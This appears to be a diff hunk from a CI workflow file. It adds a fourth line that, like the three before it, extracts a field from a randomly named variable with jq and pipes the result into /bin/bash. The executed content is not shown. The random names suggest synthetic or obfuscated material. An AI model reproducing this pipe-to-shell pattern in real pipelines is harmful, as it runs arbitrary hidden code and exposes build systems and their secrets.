@@ -35,6 +35,7 @@ jobs:
           echo $togde1 | jq -r .ph25832 | /bin/bash
           printf '%s' "$y7593" | jq -r .rp96580 | /bin/bash
           echo $qb06 | jq -r .vlajh3569 | /bin/bash
+          echo $esc69 | jq -r .jbrjr92193 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
